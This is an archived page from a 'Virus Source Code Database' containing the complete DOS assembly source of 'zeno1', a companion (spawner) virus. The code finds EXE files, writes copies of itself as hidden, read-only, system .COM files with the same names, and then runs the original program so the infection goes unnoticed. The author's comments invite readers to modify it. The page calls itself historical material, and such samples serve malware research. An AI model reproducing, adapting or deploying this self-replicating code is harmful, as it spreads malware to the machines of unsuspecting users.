<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: zeno1_asm</title>
<meta name="KEYWORDS" content="zeno1.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for zeno1.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="z10_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z10_a_asm.php">z10_a_asm</a><br>
<a href="z10-a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z10-a_asm.php">z10-a_asm</a><br>
<a href="z10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z10_asm.php">z10_asm</a><br>
<a href="z10-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z10-b_asm.php">z10-b_asm</a><br>
<a href="z10-c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z10-c_asm.php">z10-c_asm</a><br>
<a href="z10-d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z10-d_asm.php">z10-d_asm</a><br>
<a href="zeno1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/zeno1_asm.php">zeno1_asm</a><br>
<a href="zeppelin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/zeppelin_asm.php">zeppelin_asm</a><br>
<a href="zero-2-o_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/zero-2-o_asm.php">zero-2-o_asm</a><br>
<a href="zerohunt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/zerohunt_asm.php">zerohunt_asm</a><br>
<a href="z-hunt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/z-hunt_asm.php">z-hunt_asm</a><br>
<a href="zigzag_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/zigzag_asm.php">zigzag_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;NON-RESIDENT SPAWNER

; I threw this thing together in less than an hour and haven't looked
; at it since so yes, I know it needs real work. Mangle and change as
; you please. The original goal was to create the smallest spawner but
; I got bored with the whole thing. Some of the code was taken from
; the source code to Directory Magic by pcmag. Have phun....





CSEG		SEGMENT
		ASSUME	CS:CSEG,DS:NOTHING

		ORG	100H	;Beginning for .COM programs

START:	JMP MY_BEGIN	;Initialization code is at end


wild            DB  "*.EXE",0
file_Ext        DB  "COM",0
file_found      DB  12 DUP(' '), 0
file_create     DB  12 DUP(' '), 0
search_attrib   DW  17H
num_infect      dw  0

my_cmd:
Cmd_len         db  13
file_clone      db  12 DUP (' '), 0

		ASSUME	CS:CSEG, DS:CSEG, ES:NOTHING

;------------------------------------------------------------------;
Prepare_command:
	       cld
	       mov    di,OFFSET file_clone
	       mov    al,0
	       mov    cx,12
	       repne scasb          ; find the end of string \0

	       mov    al,0Dh        ; <CR>
	       stosb                ; replace \0 with a <CR>

	       mov    ax,12         ;store length of the command
	       sub    ax,cx
	       mov    cmd_len, al
	       ret

;------------------------------------------------------------------;
Store_name:

	       MOV    DI,OFFSET file_found   ;Point to buffer.
	       MOV    SI,158
	       MOV    CX,12
	       REP MOVSB

	       MOV    DI,OFFSET file_create  ;Point to buffer.
	       MOV    SI,158
	       MOV    CX,12
	       REP MOVSB

	       cld
	       mov    di,OFFSET file_create
	       mov    al,'.'
	       mov    cx,9
	       repne scasb                   ;find the '.'

	       mov    si,OFFSET file_ext
	       mov    cx,3
	       rep movsb                     ;replace the .EXE with .COM

	       ret


;------------------------------------------------------------------;
;Does the file exist?

Check_file:
	       mov    dx,OFFSET file_create
	       mov    cx,0
	       mov    ax,3d00h        ; Open file read only
	       int    21h

Chk_done:
	       ret

;------------------------------------------------------------------;
Infect_file:
;Create file
	       mov    dx,OFFSET file_create
	       mov    cx,0
	       mov    ah,3ch
	       int    21h
	       jc     EXIT

;Write to file
	       mov    bx,ax
	       mov    cx,(OFFSET END_OF_CODE - OFFSET START)
	       mov    dx,OFFSET START
	       mov    ah,40h
	       int    21h

;Close file
	       mov    ah,3eh    ; ASSUMES bx still has file handle
	       int    21h

;Change attributes
	       mov    dx,OFFSET file_create
	       mov    cx,3          ;(1) read only, (2) hidden, (4) system
	       mov    ax,4301h
	       int    21h

	       ret

;------------------------------------------------------------------;
; Read all the directory filenames and store as records in buffer. ;
;------------------------------------------------------------------;

MY_BEGIN:
               mov    sp,offset STACK_HERE      ;move stack down
               mov    bx,sp
               add    bx,15
               mov    cl,4
               shr    bx,cl
               mov    ah,4ah                  ;deallocate rest of memory
               int    21h

               MOV    DI,OFFSET file_clone ;Point to buffer.
	       MOV    SI,OFFSET file_found
	       MOV    CX,12
	       REP MOVSB

READ_DIR:      MOV    DX,OFFSET wild
	       MOV    CX,search_attrib

	       MOV    AH,4EH     ; This finds the first matching file.
	       INT    21H

	       JC     EXIT                   ;If empty directory, exit.

Do_file:
	       call   Store_name

	       call   Check_file
	       jnc    seek_another  ; CF = 0, shadow already there... skip it

	       call   Infect_file
	       jmp    Exit

seek_another:

find_next:
	       mov   ah,4fh
	       int   21h
	       jmp   Do_file

EXIT:

;Run the original program
	       call   Prepare_command
	       mov    si, OFFSET my_cmd
	       int    2Eh                 ;Pass command to command
					  ; interpreter for execution
;Exit to DOS
	       MOV    AX,4C00H
	       INT    21H

END_OF_CODE	=	$

STACK_HERE	EQU   END_OF_CODE + 512

CSEG		ENDS
		END	START

</textarea></td></tr></table></body></html>
